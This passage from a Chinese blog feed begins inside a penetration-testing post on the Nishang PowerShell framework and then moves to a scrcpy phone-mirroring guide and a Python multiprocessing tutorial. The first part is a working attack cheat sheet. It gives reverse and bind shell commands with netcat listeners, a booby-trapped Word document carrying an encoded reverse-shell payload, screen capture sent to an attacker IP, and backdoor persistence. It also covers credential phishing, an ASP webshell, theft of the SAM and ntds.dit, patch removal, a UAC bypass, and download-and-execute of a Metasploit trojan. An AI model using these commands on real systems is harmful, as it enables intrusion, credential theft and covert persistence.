-ComputerName  xx-PC  -UserList user.txt  -PasswordList pass.txt  -Service ActiveDirectory  -Verbose</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 内网扫描器</span><br><span class="line"></span><br><span class="line"># 用于对内网进行扫描，打开本地监听，然后远程传送数据，把把发送给FireListener</span><br><span class="line"></span><br><span class="line">#1.在本机开启监听</span><br><span class="line">FireListener 130-150</span><br><span class="line">#2.在目标机器输入命令：</span><br><span class="line">FireListener 192.168.0.107 130-150 -Verbose</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 内网嗅探</span><br><span class="line"></span><br><span class="line">动静很大，实在没有办法的时候可以试试</span><br><span class="line">目标机执行以下命令</span><br><span class="line">Invoke-Interceptor -ProxyServer 192.168.250.172 -ProxyPort 9999</span><br><span class="line">本机监听</span><br><span class="line">nc -lvvp 9999</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 屏幕窃取   Show-TargetScreen</span><br><span class="line"></span><br><span class="line">#本机可以使用nc获取powercat进行监听（在本地使用支持MJPEG的浏览器比如firefox，访问本机对应监听端口，即可在浏览器上看到从远端传输回来的实时画面，正向反向均可）</span><br><span class="line">Show-TargetScreen -Reverse -IPAddress 192.168.230.1 -Port 443   # 将远程的画面传输给 192.168.230.1 的443端口</span><br><span class="line">参数： Bind --&gt; 正向连接</span><br><span class="line"></span><br><span class="line">在目标机执行以下命令（反向连接）</span><br><span class="line">Show-TargetScreen  -IPAddress 192.168.230.172 -Port 3333</span><br><span class="line">本机输入以下命令 ，接着访问本机的9999端口</span><br><span class="line">nc -nlvp 3333 | nc -nlvp 9999</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">正向连接</span><br><span class="line">目标机执行：</span><br><span class="line">Show-TargetScreen -Bind -Port 3333</span><br><span class="line">本机执行：</span><br><span class="line">nc -nv 192.168.230.37 3333 | nc -lnvp 9999</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Client 的生成(类似木马)</span><br><span class="line"></span><br><span class="line">需要自己绑定payload</span><br><span class="line">首先在本机监听：</span><br><span class="line">nc -lvp 4444</span><br><span class="line">接着制作word文件，打开\nishang\Shell\Invoke-PowerShellTcpOneLine.ps1文件，复制第三行的内容，可以看到有一个`TcpClient`的参数，这就是远程连接的地址，把他改为本机的IP和你监听的端口，改完以后复制代码，在命令行下如下执行</span><br><span class="line">Invoke-Encode -DataToEncode &apos;复制的代码&apos; -IsString -PostScript</span><br><span class="line">执行完之后会在当前目录生成两个文件，一个是encode.txt， 一个是encodedcommand.txt</span><br><span class="line">接着执行命令</span><br><span class="line">Out-Word-PayloadScript .\encodedcommand.txt</span><br><span class="line">会生成一个word文档，用户打开就中招，我们获取到反弹的powershell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##  后门</span><br><span class="line"></span><br><span class="line">1.Http-Backdoor</span><br><span class="line">可以帮助我们在目标机器上下载和执行powershell脚本，接收来自第三方网站的制定，然后在内存中执行powershell脚本</span><br><span class="line"></span><br><span class="line">2.Add-ScrnSaveBackdoor</span><br><span class="line">利用windows的屏保来留下一个隐藏的后门</span><br><span class="line"></span><br><span class="line">3.Execute-OnTime</span><br><span class="line">与Http-Backdoor相比，多了定时功能</span><br><span class="line"></span><br><span class="line">4.Invoke-ADSBackdoor</span><br><span class="line">使用NTFS数据流留下的一个永久后门</span><br><span class="line">最恐怖的后门</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 钓鱼攻击(有道用户输入自己机器的密码)</span><br><span class="line"></span><br><span class="line">Invoke-CredentialsPhish</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## webshell后门   位于 \nishang\Antak-WebShell目录下</span><br><span class="line"></span><br><span class="line">就是一个asp的大马（使用的是powershell的命令，比cmd命令强大）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 复制sam文件（如果运行在DC机上，ntds.dit和SYSTEM hive也能被拷贝出来）</span><br><span class="line"></span><br><span class="line">Copy-VSS    # 直接把文件保存在当前路径下</span><br><span class="line">Copy-VSS -DEstinationDir C:temp    # 制定文件保存路径（必须是已存在的路径）</span><br><span class="line"></span><br><span class="line">## 其他......</span><br></pre></td></tr></table></figure><h6 id="后续控制"><a href="#后续控制" class="headerlink" title="后续控制"></a>后续控制</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># windows上没有nc，需要提前上传一个nc.exe，推荐Linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## No1.反向连接（我用公网来连接目标内网，因为我获取不到内网的公网ip）  在Shells目录下面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.攻击机器上 NC下执行: </span></span><br><span class="line">nc -lvp <span class="number">3333</span></span><br><span class="line"><span class="comment">#2.在目标服务器 PowerShell下执行：  TCO的</span></span><br><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192.168</span><span class="number">.0</span><span class="number">.103</span> -Port <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## NO2.正向连接:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.目标 PowerShell下执行:  TCP的，  另外还有UDP的: </span></span><br><span class="line">Invoke-PowerShellTcp -Bind -Port <span class="number">3333</span></span><br><span class="line"><span class="comment">#NC下执行: 请求他的3333端口</span></span><br><span class="line">nc -nv <span class="number">192.168</span><span class="number">.0</span><span class="number">.103</span> <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 基于UDP( Invoke-PowerShellUdp )，  nc命令有点不同</span></span><br><span class="line"></span><br><span class="line">正向连接</span><br><span class="line">nc -nvu <span class="number">192.168</span><span class="number">.0</span><span class="number">.103</span> <span class="number">3333</span></span><br><span class="line">反向连接</span><br><span class="line">nc lup <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 基于http和https  （ Invoke-PoshRatHttp ）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 此外,还有http的shell(执行完会生成一条命令，然后???)</span></span><br><span class="line"></span><br><span class="line">Invoke-PoshRatHttp -Reverse -IPAddress <span class="number">192.168</span><span class="number">.0</span><span class="number">.103</span> -Port <span class="number">3333</span></span><br><span class="line">Invoke-PoshRatHttps -Reverse -IPAddress <span class="number">192.168</span><span class="number">.0</span><span class="number">.103</span> -Port <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后将生成的命令复制到`目标机`cmd执行，执行完毕会自动消失，然后在本机的powershell下会返回目标机的会话</span></span><br></pre></td></tr></table></figure><h6 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h6><p>在nishang目录下面的ActiveDirectory下面</p><p><strong>疑难杂症</strong><br>1.真实案例分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.各种安全限制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">无解析</span><br><span class="line"></span><br><span class="line">无权限</span><br><span class="line"></span><br><span class="line">无执行</span><br></pre></td></tr></table></figure><h6 id="系统提权"><a href="#系统提权" class="headerlink" title="系统提权"></a>系统提权</h6><ul><li>基于数据库</li><li>基于漏洞（常用，如果电脑没补丁，可以删除补丁）</li><li>第三方软件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统的补丁</span></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除补丁</span></span><br><span class="line">Remove-Update   <span class="comment"># 然后输入补丁编号</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除全部补丁</span></span><br><span class="line">Remove-Update All</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除全部的安全补丁</span></span><br><span class="line">Remove-Update Security</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除指定的补丁</span></span><br><span class="line">Remove-Update KB2761226</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### Bypass  UAC    :   模块:Invoke-PsUACme</span></span><br><span class="line">UAC (用户账户控制)</span><br><span class="line">Get-Help  获取帮助</span><br></pre></td></tr></table></figure><h6 id="powershell下载文件-nishang"><a href="#powershell下载文件-nishang" class="headerlink" title="powershell下载文件(nishang)"></a>powershell下载文件(nishang)</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$client = new-object System.Net.WebClient</span><br><span class="line">$client.DownloadFile(<span class="string">'#1'</span>, <span class="string">'#2'</span>)</span><br><span class="line"><span class="comment">#1是需要下载文件的url</span></span><br><span class="line"><span class="comment">#2是保存为本地文件的路径，包括文件名</span></span><br><span class="line">例如：</span><br><span class="line">$client.DownloadFile(<span class="string">'https://www.2cto.com/net/201611/562900.html'</span>, <span class="string">'D:/562900.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者这个方法</span></span><br><span class="line"></span><br><span class="line">$src = <span class="string">'https://www.pstips.net/index.php'</span></span><br><span class="line">$des = <span class="string">"$env:temp\index.php"</span></span><br><span class="line">Invoke-WebRequest -uri $src -OutFile $des</span><br><span class="line">Unblock-File $des</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载完之后就可以用啦</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 下载执行       Download_Execute</span></span><br><span class="line"></span><br><span class="line">下载文本文件，然后转换为可执行文件执行</span><br><span class="line"></span><br><span class="line">利用exetotext.ps1把msf生成的木马端`msf.exe`更改为`msf.txt`文件</span><br><span class="line">ExetoTxt c:msf.exe  c:msf.txt</span><br><span class="line"></span><br><span class="line">然后输入以下命令，调用`Download Execute`脚本下载并执行该文件</span><br><span class="line">Download Execute http://<span class="number">192.168</span><span class="number">.110</span><span class="number">.128</span>/msf.txt</span><br><span class="line"></span><br><span class="line">这时，msf的监听端就会成功获得反弹回来的shell</span><br></pre></td></tr></table></figure><blockquote><p>powershell是没有杀毒软件提示的</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网分类：&quot;&gt;&lt;a href=&quot;#内网分类：&quot; class=&quot;headerlink&quot; title=&quot;内网分类：&quot;&gt;&lt;/a&gt;内网分类：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;带域环境的内网&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;不带域环境的内网&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网" scheme="http://www.xpshuai.cn/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="渗透" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>scrcpy-手机与电脑投屏神器</title>
    <link href="http://www.xpshuai.cn/scrcpy-%E6%89%8B%E6%9C%BA%E4%B8%8E%E7%94%B5%E8%84%91%E6%8A%95%E5%B1%8F%E7%A5%9E%E5%99%A8/"/>
    <id>http://www.xpshuai.cn/scrcpy-手机与电脑投屏神器/</id>
    <published>2020-02-24T14:11:37.000Z</published>
    <updated>2020-02-24T14:15:00.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="scrcpy-安装"><a href="#scrcpy-安装" class="headerlink" title="scrcpy 安装"></a>scrcpy 安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap install scrcpy</span><br></pre></td></tr></table></figure><h4 id="adb服务安装"><a href="#adb服务安装" class="headerlink" title="adb服务安装"></a>adb服务安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install android-tools-adb</span><br></pre></td></tr></table></figure><h4 id="adb配置"><a href="#adb配置" class="headerlink" title="adb配置"></a>adb配置</h4><h6 id="手机通过USB连接电脑"><a href="#手机通过USB连接电脑" class="headerlink" title="手机通过USB连接电脑"></a>手机通过USB连接电脑</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p>找到自己手机的识别号,(可以对比数据线插入之前和插入之后多了哪个就是哪个)</p><h6 id="创建设备文件"><a href="#创建设备文件" class="headerlink" title="创建设备文件"></a>创建设备文件</h6><p>下面所有的<code>04e8</code>改成自己的识别号, <code>android.rules</code>文件名可自定义</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.android</span><br><span class="line"><span class="comment"># 注意你的设备号</span></span><br><span class="line"><span class="built_in">echo</span> 0x04e8 &gt; ~/.android/adb_usb.ini</span><br><span class="line">sudo touch /etc/udev/rules.d/android.rules</span><br><span class="line">sudo gedit /etc/udev/rules.d/android.rules</span><br></pre></td></tr></table></figure><h6 id="在文件中输入"><a href="#在文件中输入" class="headerlink" title="在文件中输入:"></a>在文件中输入:</h6><p>注意自己的设备号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSYSTEM==&quot;usb&quot;, SYSFS&#123;idVendor&#125;==&quot;你的设备号&quot;, MODE=&quot;0666&quot;</span><br></pre></td></tr></table></figure><h6 id="保存后修改文件权限"><a href="#保存后修改文件权限" class="headerlink" title="保存后修改文件权限"></a>保存后修改文件权限</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 /etc/udev/rules.d/android.rules</span><br></pre></td></tr></table></figure><h6 id="启动adb服务"><a href="#启动adb服务" class="headerlink" title="启动adb服务"></a>启动adb服务</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service udev restart</span><br><span class="line">adb start-server</span><br><span class="line">adb devices</span><br></pre></td></tr></table></figure><p>有设备就说明成功了, 如果没有看看自己手机的开发者模式以及USB调试有没有打开</p><h4 id="使用scrcpy"><a href="#使用scrcpy" class="headerlink" title="使用scrcpy"></a><strong>使用scrcpy</strong></h4><p>命令行输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接使用</span></span><br><span class="line">scrcpy</span><br><span class="line"><span class="comment"># 设置显示尺寸为1080</span></span><br><span class="line">nohun scrcpy -m <span class="number">1080</span> &amp;</span><br></pre></td></tr></table></figure><p>就会弹出界面了</p><h6 id="scrcpy使用方法"><a href="#scrcpy使用方法" class="headerlink" title="scrcpy使用方法"></a>scrcpy使用方法</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">鼠标左键点击、滑动;</span></span><br><span class="line"><span class="string">长按鼠标中键回到主屏幕;Ctrl+Shift+V</span></span><br><span class="line"><span class="string">鼠标右键返回复制文本电脑到手机:  电脑上复制后, 在手机投屏界面按Ctrl+Shift+V复制到手机剪切板, 然后手机中粘贴手机到电脑: 手机上复制到剪切板中, 在投屏界面按下Ctrl+C键，再到电脑正常上粘贴传输文件: 直接在文件管理器复制粘贴</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><h6 id="全屏-回到合适尺寸"><a href="#全屏-回到合适尺寸" class="headerlink" title="全屏/回到合适尺寸"></a>全屏/回到合适尺寸</h6><p><code>ctrl +f</code>    <code>ctrl + x</code></p><h6 id="展开-折叠通知栏"><a href="#展开-折叠通知栏" class="headerlink" title="展开/折叠通知栏"></a>展开/折叠通知栏</h6><p><code>ctrl +n</code>   <code>ctrl + shift + n</code></p><h4 id="结束投屏"><a href="#结束投屏" class="headerlink" title="结束投屏"></a>结束投屏</h4><p><code>scrcpy -S</code></p><p>或者关掉显示窗口即可</p><hr><h4 id="Scrcpy-的命令参数"><a href="#Scrcpy-的命令参数" class="headerlink" title="Scrcpy 的命令参数"></a>Scrcpy 的命令参数</h4><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>关闭手机屏幕</strong></td><td><code>scrcpy -S</code></td></tr><tr><td><strong>限制画面分辨率</strong></td><td><code>scrcpy -m 1024</code> (比如限制为 1024)</td></tr><tr><td><strong>修改视频码率</strong></td><td><code>scrcpy -b 4M</code> (默认 8Mbps，改成 4Mbps)</td></tr><tr><td><strong>裁剪画面</strong></td><td><code>scrcpy -c 1224:1440:0:0</code> 表示分辨率 1224x1440 并且偏移坐标为 (0,0)</td></tr><tr><td><strong>多设备切换</strong></td><td><code>scrcpy -s 设备ID</code> (使用 <code>adb devices</code> 命令查看设备ID)</td></tr><tr><td><strong>窗口置顶</strong></td><td><code>scrcpy -T</code></td></tr><tr><td><strong>显示触摸点击</strong></td><td><code>scrcpy -t</code> 在演示或录制教程时，可在画面上对应显示出点击动作</td></tr><tr><td><strong>全屏显示</strong></td><td><code>scrcpy -f</code></td></tr><tr><td><strong>文件传输默认路径</strong></td><td><code>scrcpy --push-target /你的/目录</code> 将文件拖放到 scrcpy 可以传输文件，此命令指定默认保存目录</td></tr><tr><td><strong>只读模式(仅显示不控制)</strong></td><td><code>scrcpy -n</code></td></tr><tr><td><strong>屏幕录像</strong></td><td><code>scrcpy -r 视频文件名.mp4</code> 或 <code>.mkv</code></td></tr><tr><td><strong>屏幕录像 (禁用电脑显示)</strong></td><td><code>scrcpy -Nr 文件名.mkv</code></td></tr><tr><td><strong>设置窗口标题</strong></td><td><code>scrcpy --window-title &#39;异次元好棒！&#39;</code></td></tr><tr><td><strong>同步传输声音</strong></td><td>可借助 <a href="https://github.com/rom1v/usbaudio" target="_blank" rel="noopener">USBaudio</a> 这个开源项目实现，但仅支持 <a href="https://www.iplaysoft.com/os/linux-platform" target="_blank" rel="noopener">Linux</a> 系统</td></tr></tbody></table><h4 id="Scrcpy-快捷键列表"><a href="#Scrcpy-快捷键列表" class="headerlink" title="Scrcpy 快捷键列表"></a>Scrcpy 快捷键列表</h4><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>切换全屏模式</td><td><code>Ctrl</code>+<code>F</code></td></tr><tr><td>将窗口调整为1：1（完美像素）</td><td><code>Ctrl</code>+<code>G</code></td></tr><tr><td>调整窗口大小以删除黑色边框</td><td><code>Ctrl</code>+<code>X</code> \</td><td>双击黑色背景</td></tr><tr><td>设备 <code>HOME</code> 键</td><td><code>Ctrl</code>+<code>H</code> \</td><td>鼠标中键</td></tr><tr><td>设备 <code>BACK</code> 键</td><td><code>Ctrl</code>+<code>B</code> \</td><td>鼠标右键</td></tr><tr><td>设备 <code>任务管理</code> 键 (切换APP)</td><td><code>Ctrl</code>+<code>S</code></td></tr><tr><td>设备 <code>菜单</code> 键</td><td><code>Ctrl</code>+<code>M</code></td></tr><tr><td>设备<code>音量+</code>键</td><td><code>Ctrl</code>+<code>↑</code></td></tr><tr><td>设备<code>音量-</code>键</td><td><code>Ctrl</code>+<code>↓</code></td></tr><tr><td>设备<code>电源键</code></td><td><code>Ctrl</code>+<code>P</code></td></tr><tr><td>点亮手机屏幕</td><td>鼠标右键</td></tr><tr><td>复制内容到设备</td><td><code>Ctrl</code>+<code>V</code></td></tr><tr><td>启用/禁用 FPS 计数器（stdout）</td><td><code>Ctrl</code>+<code>i</code></td></tr><tr><td>安装APK</td><td>将 apk 文件拖入投屏</td></tr><tr><td>传输文件到设备</td><td>将文件拖入投屏（非apk）</td></tr></tbody></table><ul><li><strong>投屏并录屏：</strong><code>scrcpy -r file.mp4</code></li><li><strong>不投屏只录屏：</strong><code>scrcpy -Nr file.mp4</code></li></ul><h6 id="录制声音"><a href="#录制声音" class="headerlink" title="录制声音"></a>录制声音</h6><p>结合：<a href="https://github.com/rom1v/usbaudio" target="_blank" rel="noopener">https://github.com/rom1v/usbaudio</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;scrcpy-安装&quot;&gt;&lt;a href=&quot;#scrcpy-安装&quot; class=&quot;headerlink&quot; title=&quot;scrcpy 安装&quot;&gt;&lt;/a&gt;scrcpy 安装&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
      <category term="工具" scheme="http://www.xpshuai.cn/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://www.xpshuai.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="scrcpy" scheme="http://www.xpshuai.cn/tags/scrcpy/"/>
    
  </entry>
  
  <entry>
    <title>python-进程</title>
    <link href="http://www.xpshuai.cn/python-%E8%BF%9B%E7%A8%8B/"/>
    <id>http://www.xpshuai.cn/python-进程/</id>
    <published>2020-02-24T06:40:02.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>并发：</strong>   任务数大于cpu个数</p><p><strong>并行：</strong>    cpu个数和任务数相同</p><p><strong>GIL 锁:</strong>   任何python进程中，一次永远只有一个线程运行</p><p>一个python进程  只能执行一个线程</p><h6 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 不同操作系统创建进程的区别：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#linux上:   fork() </span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">pid = os.fork() <span class="comment"># 这个地方会创建一个子进程， 他的pid号值永远为0</span></span><br><span class="line"><span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">    print(<span class="string">"我是子进程"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"我是父进程"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># win上创建进程 类似于导入机制   都通用的</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"000"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = multiprocessing.Process(target=func)  <span class="comment"># 生成进程, 传参target= ，args=</span></span><br><span class="line">    p.start()       <span class="comment"># 开启进程， 相当于一个子进程</span></span><br></pre></td></tr></table></figure><h6 id="进程标识"><a href="#进程标识" class="headerlink" title="进程标识"></a>进程标识</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进程标识  pid</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"main pid "</span>, os.getpid())   <span class="comment"># 当前进程的</span></span><br><span class="line">print(multiprocessing.current_process().pid)</span><br><span class="line">    p = multiprocessing.Process(target=func)</span><br><span class="line">    print(p.pid)</span><br><span class="line">    p.start()     <span class="comment"># start之后才有pid号</span></span><br><span class="line">    print(p.pid)</span><br><span class="line">    time.sleep(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 线程的标识是 ident</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 操作系统调用的是进程</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">注意！</span></span><br><span class="line"><span class="string">操作系统并不能看到线程的标识。</span></span><br><span class="line"><span class="string">因为，线程是由Python解释器</span></span><br><span class="line"><span class="string">来负责调度的。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">操作系统仅需要调度进程就行了</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h6 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 守护进程  daemon = True  主进程结束之后，子进程跟着结束（某子进程的生命周期随着主进程）</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">20</span>)</span><br><span class="line">    print(<span class="string">"子进程结束"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p = multiprocessing.Process(target=func, daemon = <span class="literal">True</span>)</span><br><span class="line">    p.daemon = <span class="literal">True</span>   <span class="comment"># 设置成守护进程 p True会随着主进程结束而结束， 主进程不会等待子进程结束</span></span><br><span class="line">    p.start()</span><br><span class="line">    